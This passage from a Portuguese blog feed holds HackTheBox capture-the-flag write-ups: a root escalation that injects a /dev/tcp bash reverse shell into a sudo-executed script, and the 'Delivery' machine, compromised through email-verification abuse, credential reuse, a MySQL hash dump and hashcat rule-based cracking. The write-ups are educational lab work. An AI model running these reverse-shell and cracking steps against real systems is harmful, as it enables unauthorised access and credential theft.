<p>Com acesso ao host foi utilizado o <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linPEAS</a> para enumerar e obter mais informações sobre a máquina. O resultado mostrou as credenciais do usuário admin no arquivo de configuração de usuários do Tomcat.</p>

    <img src="https://i.imgur.com/RAqNATf.png"  alt="Tomcat admin user"  class="center"  style="border-radius: 8px;"  />


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">admin:whythereisalimit
</code></pre></div><p>Com estas credenciais foi feita a movimentação lateral, logando no usuário admin pelo terminal.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ su - admin
</code></pre></div>
    <img src="https://i.imgur.com/GXkh9Y3.png"  alt="Su admin"  class="center"  style="border-radius: 8px;"  />


<p>Obtendo a flag do usuário admin.</p>

    <img src="https://i.imgur.com/ptpMMcq.png"  alt="Flag admin user"  class="center"  style="border-radius: 8px;"  />


<h2 id="escalação-de-privilégios">Escalação de Privilégios</h2>
<p>Para escalar privilégio na máquina foi verificada as permissões do usuário admin com o sudo.</p>

    <img src="https://i.imgur.com/6ZaZ88X.png"  alt="Admin sudo"  class="center"  style="border-radius: 8px;"  />


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
</code></pre></div><p>Analisando o diretório do usuário admin foi encontrado um arquivo deploy.sh.</p>

    <img src="https://i.imgur.com/GOH0lBA.png"  alt="Admin sudo"  class="center"  style="border-radius: 8px;"  />


<p>O usuário admin possui permissão para executar o aquivo index.go (feito em <a href="https://golang.org/">Go</a>). Este é o conteúdo do arquivo.</p>

    <img src="https://i.imgur.com/nfM3Jyn.png"  alt="Arquivo index.go"  class="center"  style="border-radius: 8px;"  />


<p>Juntando as partes, o index.go irá executar, com permissões de root, qualquer código malicioso injetado no deploy.sh. A última etapa é inserir um &lsquo;reverse shell&rsquo; neste arquivo e executar o index.go com sudo.</p>
<p>Conteúdo injetado no arquivo deploy.sh.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/bin/bash -c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/4444 0&gt;&amp;1&#39;</span>;
</code></pre></div><p>Executando o arquivo index.go.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo /usr/bin/go run /opt/wasm-functions/index.go
</code></pre></div><p>Obtendo a &lsquo;reverse shell&rsquo; como usuário root.</p>

    <img src="https://i.imgur.com/omQVD8w.png"  alt="Root shell"  class="center"  style="border-radius: 8px;"  />


<p>Obtendo a flag do usuário root.</p>

    <img src="https://i.imgur.com/8a7KA8Z.png"  alt="Root flag"  class="center"  style="border-radius: 8px;"  />


<p>Neste &lsquo;writeup&rsquo; foi demonstrado como uma vulnerabilidade de desserialização via Web pode comprometer um servidor. Também vimos como uma permissão de execução de binário ou script pode permitir ao atacante o controle total da máquina.</p>
<p>Até a próxima!</p>
]]></content>
        </item>
        
        <item>
            <title>HackTheBox - Delivery</title>
            <link>https://brunomcuesta.github.io/posts/2021/06/hackthebox-delivery/</link>
            <pubDate>Wed, 23 Jun 2021 13:23:07 -0300</pubDate>
            
            <guid>https://brunomcuesta.github.io/posts/2021/06/hackthebox-delivery/</guid>
            <description>Neste &amp;lsquo;writeup&amp;rsquo; veremos a resolução da máquina &amp;lsquo;Delivery&amp;rsquo; do HackTheBox. O autor desta máquina é o ippsec, um conhecido membro do HTB que costuma postar a resolução de máquinas retiradas em seu canal no Youtube. Ele também possui um site que permite filtrar seus vídeos no Youtube de acordo com o que é informado na busca.
Informações da Máquina IP: 10.10.10.222
Sistema Operacional: Linux
Nível de dificuldade: Easy
Varredura e Enumeração Port Scan O primeiro passo é iniciar um scan preliminar pelas portas TCP abertas e logo em seguida um segundo scan para determinar a versão dos serviços que estão rodando no servidor.</description>
            <content type="html"><![CDATA[
    <img src="https://i.imgur.com/EeEdgR4.jpg"  alt="Delivery Cover"  class="center"  style="border-radius: 8px;"  />


<p>Neste &lsquo;writeup&rsquo; veremos a resolução da máquina &lsquo;Delivery&rsquo; do <a href="https://www.hackthebox.eu/">HackTheBox</a>. O autor desta máquina é o <a href="https://www.hackthebox.eu/profile/3769">ippsec</a>, um conhecido membro do HTB que costuma postar a resolução de máquinas retiradas em seu canal no <a href="https://www.youtube.com/c/ippsec">Youtube</a>. Ele também possui um <a href="https://ippsec.rocks/">site</a> que permite filtrar seus vídeos no Youtube de acordo com o que é informado na busca.</p>
<h2 id="informações-da-máquina">Informações da Máquina</h2>
<p>IP: 10.10.10.222</p>
<p>Sistema Operacional: Linux</p>
<p>Nível de dificuldade: Easy</p>
<h2 id="varredura-e-enumeração">Varredura e Enumeração</h2>
<h3 id="port-scan">Port Scan</h3>
<p>O primeiro passo é iniciar um scan preliminar pelas portas TCP abertas e logo em seguida um segundo scan para determinar a versão dos serviços que estão rodando no servidor. Este é o resultado do Nmap.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.91 scan initiated Fri May 14 15:27:04 2021 as: nmap -v -sC -sV -p 22,80,8065 -Pn -oN details 10.10.10.222</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.222
Host is up <span style="color:#f92672">(</span>0.31s latency<span style="color:#f92672">)</span>.

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp   open  http    nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
8065/tcp open  unknown
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request
|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 <span style="color:#ae81ff">200</span> OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age<span style="color:#f92672">=</span>31556926, public
|     Content-Length: <span style="color:#ae81ff">3108</span>
|     Content-Security-Policy: frame-ancestors <span style="color:#e6db74">&#39;self&#39;</span>; script-src <span style="color:#e6db74">&#39;self&#39;</span> cdn.rudderlabs.com
|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
|     Last-Modified: Fri, <span style="color:#ae81ff">14</span> May <span style="color:#ae81ff">2021</span> 16:47:36 GMT
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: 6iwifyweep85fkyk7iimfj8kfo
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Fri, <span style="color:#ae81ff">14</span> May <span style="color:#ae81ff">2021</span> 18:38:43 GMT
|     &lt;!doctype html&gt;&lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;&lt;head&gt;&lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0&#34;</span>&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;robots&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;noindex, nofollow&#34;</span>&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;referrer&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;no-referrer&#34;</span>&gt;&lt;title&gt;Mattermost&lt;/title&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mobile-web-app-capable&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;yes&#34;</span>&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;application-name&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Mattermost&#34;</span>&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;format-detection&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;telephone=no&#34;</span>&gt;&lt;link re
|   HTTPOptions: 
|     HTTP/1.0 <span style="color:#ae81ff">405</span> Method Not Allowed
|     Date: Fri, <span style="color:#ae81ff">14</span> May <span style="color:#ae81ff">2021</span> 18:38:44 GMT
|_    Content-Length: <span style="color:#ae81ff">0</span>
<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8065-TCP:V<span style="color:#f92672">=</span>7.91%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>5/14%Time<span style="color:#f92672">=</span>609EC102%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>Ge
SF:nericLines,67,<span style="color:#e6db74">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
</span><span style="color:#e6db74">SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
</span><span style="color:#e6db74">SF:20Request&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GetRequest,DF3,<span style="color:#e6db74">&#34;HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\
</span><span style="color:#e6db74">SF:x20bytes\r\nCache-Control:\x20no-cache,\x20max-age=31556926,\x20public\
</span><span style="color:#e6db74">SF:r\nContent-Length:\x203108\r\nContent-Security-Policy:\x20frame-ancesto
</span><span style="color:#e6db74">SF:rs\x20&#39;self&#39;;\x20script-src\x20&#39;self&#39;\x20cdn\.rudderlabs\.com\r\nConten
</span><span style="color:#e6db74">SF:t-Type:\x20text/html;\x20charset=utf-8\r\nLast-Modified:\x20Fri,\x2014\
</span><span style="color:#e6db74">SF:x20May\x202021\x2016:47:36\x20GMT\r\nX-Frame-Options:\x20SAMEORIGIN\r\n
</span><span style="color:#e6db74">SF:X-Request-Id:\x206iwifyweep85fkyk7iimfj8kfo\r\nX-Version-Id:\x205\.30\.
</span><span style="color:#e6db74">SF:0\.5\.30\.1\.57fb31b889bf81d99d8af8176d4bbaaa\.false\r\nDate:\x20Fri,\x
</span><span style="color:#e6db74">SF:2014\x20May\x202021\x2018:38:43\x20GMT\r\n\r\n&lt;!doctype\x20html&gt;&lt;html\x
</span><span style="color:#e6db74">SF:20lang=\&#34;en\&#34;&gt;&lt;head&gt;&lt;meta\x20charset=\&#34;utf-8\&#34;&gt;&lt;meta\x20name=\&#34;viewport
</span><span style="color:#e6db74">SF:\&#34;\x20content=\&#34;width=device-width,initial-scale=1,maximum-scale=1,user
</span><span style="color:#e6db74">SF:-scalable=0\&#34;&gt;&lt;meta\x20name=\&#34;robots\&#34;\x20content=\&#34;noindex,\x20nofollo
</span><span style="color:#e6db74">SF:w\&#34;&gt;&lt;meta\x20name=\&#34;referrer\&#34;\x20content=\&#34;no-referrer\&#34;&gt;&lt;title&gt;Matter
</span><span style="color:#e6db74">SF:most&lt;/title&gt;&lt;meta\x20name=\&#34;mobile-web-app-capable\&#34;\x20content=\&#34;yes\&#34;
</span><span style="color:#e6db74">SF:&gt;&lt;meta\x20name=\&#34;application-name\&#34;\x20content=\&#34;Mattermost\&#34;&gt;&lt;meta\x20
</span><span style="color:#e6db74">SF:name=\&#34;format-detection\&#34;\x20content=\&#34;telephone=no\&#34;&gt;&lt;link\x20re&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>H
SF:TTPOptions,5B,<span style="color:#e6db74">&#34;HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x2
</span><span style="color:#e6db74">SF:0Fri,\x2014\x20May\x202021\x2018:38:44\x20GMT\r\nContent-Length:\x200\r
</span><span style="color:#e6db74">SF:\n\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,67,<span style="color:#e6db74">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
</span><span style="color:#e6db74">SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
</span><span style="color:#e6db74">SF:400\x20Bad\x20Request&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Help,67,<span style="color:#e6db74">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r
</span><span style="color:#e6db74">SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close
</span><span style="color:#e6db74">SF:\r\n\r\n400\x20Bad\x20Request&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SSLSessionReq,67,<span style="color:#e6db74">&#34;HTTP/1\.1\x20400\x2
</span><span style="color:#e6db74">SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
</span><span style="color:#e6db74">SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TerminalServerCookie
SF:,67,<span style="color:#e6db74">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
</span><span style="color:#e6db74">SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&#34;</span>
SF:<span style="color:#f92672">)</span>;
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#75715e"># Nmap done at Fri May 14 15:29:11 2021 -- 1 IP address (1 host up) scanned in 127.39 seconds</span>
</code></pre></div><h3 id="webserver">Webserver</h3>
<p>Para acessar o site pelo seu domínio e não pelo seu ip basta inserir a linha correspondente ao arquivo /etc/hosts.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">10.10.10.222  delivery.htb
</code></pre></div><p>O site poderá ser acessado pela seguinte URL.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://delivery.htb
</code></pre></div><p>Existem três portas abertas no servidor: 22, 80 e 8065. Acessando pela porta 80 encontramos a seguinte página.</p>

    <img src="https://i.imgur.com/IFgz2yF.png"  alt="Delivery"  class="center"  style="border-radius: 8px;"  />


<p>Analisando a página o botão &ldquo;Contact Us&rdquo; aponta para duas aplicações, a &ldquo;HelpDesk&rdquo; e &ldquo;MatterMost server&rdquo;:</p>

    <img src="https://i.imgur.com/RZ6uWsh.png"  alt="Contact-Us"  class="center"  style="border-radius: 8px;"  />


<p>Adicionado o subdomínio ao /etc/hosts.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">10.10.10.222  delivery.htb helpdesk.delivery.htb
</code></pre></div><p>A aplicação agora pode ser acessada diretamente pela sua URL.</p>

    <img src="https://i.imgur.com/LpeunWd.png"  alt="Help Desk"  class="center"  style="border-radius: 8px;"  />


<p>Trata-se de um sistema de chamados <a href="https://osticket.com/">OS Ticket</a>, uma plataforma web de código fonte aberto (open source) que permite gerenciar chamados. Antes de buscar vulnerabilidades na aplicação foi efetuado o registro de um ticket para obter alguma informação que permita algum tipo de acesso administrativo.</p>

    <img src="https://i.imgur.com/fhuzHu3.png"  alt="Criar ticket"  class="center"  style="border-radius: 8px;"  />


<p>Após o registro do ticket foi gerado um e-mail pelo sistema para que o usuário possa acompanhar o status do chamado. Esta é a informação relevante obtida pelo sistema até o momento, o e-mail.</p>

    <img src="https://i.imgur.com/ayhfpPN.png"  alt="Ticket criado"  class="center"  style="border-radius: 8px;"  />


<p>A segunda aplicação que roda na porta 8065 é o Mattermost e este é o seu propósito segundo o <a href="https://mattermost.com/incident-collaboration/">site</a> do fabricante:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">O Mattermost foi desenvolvido como um centro de comando de comunicação
para ajudar as equipes de DevOps a orquestrar fluxos de trabalho
de colaboração de incidentes urgentes.
</code></pre></div><h2 id="vulnerabilidade">Vulnerabilidade</h2>
<p>Acessando esta aplicação na porta 8065 surge uma tela de login e logo abaixo um link &ldquo;Create one now&rdquo; que direciona para a tela de cadastro de usuário. O problema é que ao fazer o cadastro o sistema envia um link de confirmação ao e-mail informado. Como não há nenhum serviço de e-mail no servidor com a porta exposta, não há como explorar o serviço e visualizar o link de confirmação. A opção seria receber o e-mail do Mattermost de outra forma, talvez pelo OsTicket. Ao fazer uma pesquisa sobre recebimento de e-mails no <a href="https://docs.osticket.com/en/latest/Getting%20Started/Email%20Settings.html#:~:text=osTicket%20allows%20you%20to%20setup,support%20requests%20in%20one%20place.">site</a> do OSTicket é possível encontrar a seguinte informação:</p>

    <img src="https://i.imgur.com/GK8aRn2.png"  alt="OSTicket routing e-mails"  class="center"  style="border-radius: 8px;"  />


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">A configuração do seu sistema para aceitar vários e-mails
de sistema para sistema depende de sua preferência pessoal.
O OsTicket atualmente suporta piping (aliases) e métodos
de pesquisa POP3 / IMAP para rotear e-mails recebidos.
Os tickets são roteados para o departamento e atribuídos
a uma prioridade padrão associada ao e-mail.
</code></pre></div><p>No caso, se há roteamento de e-mails de sistema para sistema e de departamento para departamento então o que for enviado pelo sistema Mattermost poderá ser recebido no OSticket. E para visualizar o e-mail será necessário acessar o próprio ticket previamente cadastrado.</p>

    <img src="https://i.imgur.com/3xxHju9.png"  alt="Mattermost cadastro"  class="center"  style="border-radius: 8px;"  />


<p>Ao enviar o formulário pelo site do Mattermost uma mensagem de confirmação de cadastro é recebida pelo OSTicket.</p>

    <img src="https://i.imgur.com/j591Qrg.png"  alt="OSTicket - Confirmação de cadastro"  class="center"  style="border-radius: 8px;"  />


<p>O link gerado pelo Mattermost para confirmar o cadastro no sistema.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://delivery.htb:8065/do_verify_email?token=j3wgng8a3qb6tjeescmphz4dhjx9a4edj84i514tyyqy35wz9kcbix87hikh4shk&amp;email=4069966%40delivery.htb
</code></pre></div><p>Acessando o link e confirmando o cadastro o usuário é direcionado para a página inicial do Mattermost com a opção para juntar-se ao time &ldquo;internal&rdquo;.</p>

    <img src="https://i.imgur.com/3SJ0HFT.png"  alt="Mattermost inicial"  class="center"  style="border-radius: 8px;"  />


<p>Logo em seguida surge o &lsquo;dashboard&rsquo; para que o usuário possa comunicar-se com outros usuários.</p>

    <img src="https://i.imgur.com/XLOTuS6.png"  alt="Mattermost dashboard"  class="center"  style="border-radius: 8px;"  />


<h2 id="exploração">Exploração</h2>
<p>Explorando as mensagens no &lsquo;dashboard&rsquo; foi encontrada uma mensagem do usuário root e nela uma credencial de acesso.</p>

    <img src="https://i.imgur.com/6ZdXPsf.png"  alt="Mattermost mensagem root"  class="center"  style="border-radius: 8px;"  />


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">mmuser:Crack_The_MM_Admin_PW
</code></pre></div><p>Com esta credencial é possível conectar ao host pelo SSH na porta 22.</p>

    <img src="https://i.imgur.com/Dpa9NcJ.png"  alt="Acesso SSH"  class="center"  style="border-radius: 8px;"  />


<p>Obtendo a flag do usuário logado.</p>

    <img src="https://i.imgur.com/jG2x3Tv.png"  alt="Flag user"  class="center"  style="border-radius: 8px;"  />


<p>Esta credencial não permite acesso ao banco de dados Mysql, então uma enumeração de diretórios e arquivos na máquina foi necessária. Inicialmente foi feita a varredura por arquivos de configuração dos sistemas que rodam no servidor. O resultado mostrou que o Mattermost possui credenciais para acesso ao banco de dados no seu arquivo de configuração.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">/opt/mattermost/config/config.json
</code></pre></div>
    <img src="https://i.imgur.com/MwFMiyh.png"  alt="Mysql credenciais"  class="center"  style="border-radius: 8px;"  />


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">mmuser:Crack_The_MM_Admin_PW
</code></pre></div><p>Acessando o Mysql com a credencial encontrada.</p>

    <img src="https://i.imgur.com/JebaxGn.png"  alt="Mysql login"  class="center"  style="border-radius: 8px;"  />


<p>Listando os bancos de dados no servidor.</p>

    <img src="https://i.imgur.com/b4wX1Wp.png"  alt="Mysql databases"  class="center"  style="border-radius: 8px;"  />


<p>Acessando a tabela de usuários.</p>

    <img src="https://i.imgur.com/366lnbd.png"  alt="Mysql tabela de usuários"  class="center"  style="border-radius: 8px;"  />


<p>Nesta tabela foi encontrada a credencial do usuário root.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">root | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
</code></pre></div><h2 id="escalação-de-privilégios">Escalação de Privilégios</h2>
<p>As duas ferramentas mais usadas para a quebra de hashes são o john e o hashcat. Na lista de formatos suportados do hashcat a hash é reconhecida como &ldquo;bcrypt/blowfish&rdquo;.</p>

    <img src="https://i.imgur.com/G4m1hdx.png"  alt="Hashcat bcrypt"  class="center"  style="border-radius: 8px;"  />


<p>Antes de efetuar a quebra da hash com a wordlist rockyou.txt é necessário uma atenção especial na mensagem do root pelo Mattermost, onde alerta que a senha &ldquo;PleaseSubscribe!&rdquo; não estará na wordlist e que para proceder com a quebra é necessário criar uma wordlist personalizada baseada nas &ldquo;rules&rdquo; do hashcat.</p>

    <img src="https://i.imgur.com/Kksj2oW.png"  alt="Root wordlist"  class="center"  style="border-radius: 8px;"  />


<p>O hashcat possui um <a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">manual</a> que explica como criar estas wordlists personalizadas baseadas em um &ldquo;pattern&rdquo;.</p>
<p>Portanto, deve-se criar dois arquivos. Um arquivo com a hash e outro com a senha &ldquo;PleaseSubscribe!&rdquo;. Esta senha será usada como base para criar outras senhas variadas e assim gerar uma wordlist personalizada.</p>

    <img src="https://i.imgur.com/0dGC9wY.png"  alt="Arquivos"  class="center"  style="border-radius: 8px;"  />


<p>Existem diversos formatos de &ldquo;rules&rdquo; no hashcat para a geração de wordlist personalizada.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ls -l /usr/share/hashcat/rules/
</code></pre></div><p>Para gerar esta wordlist foi selecionada a &ldquo;best64.rule&rdquo;, muito utilizada em CTFs.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat --force pattern -r /usr/share/hashcat/rules/best64.rule --stdout &gt; passwords.txt
</code></pre></div><p>O comando irá gerar um arquivo passwords.txt com todas as variações de senhas. Logo em seguida se procede com a quebra da hash.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">3200</span> hash passwords.txt
</code></pre></div><p>A saída do comando revela a senha encontrada do usuário root.</p>

    <img src="https://i.imgur.com/Mn6w8aA.png"  alt="Crack hash"  class="center"  style="border-radius: 8px;"  />


<pre><code>PleaseSubscribe!21
</code></pre><p>Como citado anteriormente, esta nova senha revelada é uma variação da senha original &ldquo;PleaseSubscribe!&rdquo;.</p>
<p>Alterando para o usuário root pelo terminal com a senha descoberta.</p>

    <img src="https://i.imgur.com/PEBEeXX.png"  alt="Root login"  class="center"  style="border-radius: 8px;"  />


<p>Acessando a flag do usuário root.</p>

    <img src="https://i.imgur.com/oBqoVEQ.png"  alt="Root flag"  class="center"  style="border-radius: 8px;"  />


<p>Com acesso ao root a máquina &lsquo;Delivery&rsquo; está terminada.</p>

    <img src="https://i.imgur.com/oM7pTAq.png"  alt="Pwned"  class="center"  style="border-radius: 8px;"  />


<p>Até a próxima!</p>
]]></content>
        </item>
        
        <item>
            <title>HackTheBox - Jewel</title>
            <link>https://brunomcuesta.github.io/posts/2021/02/hackthebox-jewel/</link>
            <pubDate>Sat, 20 Feb 2021 10:00:00 -0300</pubDate>
            
            <guid>https://brunomcuesta.github.io/posts/2021/02/hackthebox-jewel/</guid>
            <description>Neste primeiro post veremos a resolução da máquina &amp;lsquo;Jewel&amp;rsquo; do HackTheBox. A resolução foi efetuada em outubro de 2020, quando a máquina estava &amp;lsquo;ativa&amp;rsquo;. Em fevereiro de 2021 a mesma passou para &amp;lsquo;retirada&amp;rsquo; e com as evidências coletadas anteriormente foi possível publicar este &amp;lsquo;writeup&amp;rsquo;.
Informações da Máquina IP: 10.10.10.211
Sistema Operacional: Linux
Nível de dificuldade: Médio
Varredura e Enumeração Port Scan Ao executar o Nmap são mostradas três portas abertas: 22, 8000 e 8080.</description>
            <content type="html"><![CDATA[
    <img src="https://i.imgur.com/IzIVCYq.png"  alt="Jewel Cover"  class="center"  style="border-radius: 8px;"  />


<p>Neste primeiro post veremos a resolução da máquina &lsquo;Jewel&rsquo; do <a href="https://www.hackthebox.eu/">HackTheBox</a>. A resolução foi efetuada em outubro de 2020, quando a máquina estava &lsquo;ativa&rsquo;. Em fevereiro de 2021 a mesma passou para &lsquo;retirada&rsquo; e com as evidências coletadas anteriormente foi possível publicar este &lsquo;writeup&rsquo;.</p>
<h2 id="informações-da-máquina">Informações da Máquina</h2>
<p>IP: 10.10.10.211</p>
<p>Sistema Operacional: Linux</p>
<p>Nível de dificuldade: Médio</p>
<h2 id="varredura-e-enumeração">Varredura e Enumeração</h2>
<h3 id="port-scan">Port Scan</h3>
<p>Ao executar o Nmap são mostradas três portas abertas: 22, 8000 e 8080.</p>

    <img src="https://i.imgur.com/tytB0Oe.png"  alt="Nmap"  class="center"  style="border-radius: 8px;"  />


<p>Utilizando os parâmetros do Nmap podemos executar também os scripts padrões para verificar vulnerabilidades, as versões dos serviços que estão rodando e gerar um arquivo com o resultado do scan.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">nmap -v -sC -sV -p 22,8000,8080 -Pn 10.10.10.211 -oN jewel-detail
</code></pre></div>
    <img src="https://i.imgur.com/YJXvrR8.png"  alt="Nmap detalhes"  class="center"  style="border-radius: 8px;"  />


<h3 id="webserver">Webserver</h3>
<p>Na saída do comando Nmap é possível verificar duas aplicações Web rodando, uma na porta 8000 e outra na 8080.
Na porta 8080, onde o Apache é executado, surge um &lsquo;Blog&rsquo;, permitindo o cadastro de usuário, login e edição do usuário cadastrado.</p>
<p>URL: http://10.10.10.211:8080/</p>

    <img src="https://i.imgur.com/VNqtOy2.png"  alt="Editar usuário"  class="center"  style="border-radius: 8px;"  />


<p>Ao acessar o link para o recurso &lsquo;gitweb&rsquo; na porta 8000 surge o código fonte do &lsquo;Blog&rsquo;, tendo o Git como seu sistema de controle de versão.</p>
<p>URL: http://10.10.10.211:8000/gitweb/</p>

    <img src="https://i.imgur.com/d7HCbmI.png"  alt="Gitweb"  class="center"  style="border-radius: 8px;"  />


<p>O acesso às aplicações pode ser feito através de seu IP ou pelo seu domínio, editando o arquivo /etc/hosts na máquina do atacante.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo vi /etc/hosts
</code></pre></div><p>Inserir a linha correspondente ao arquivo.</p>
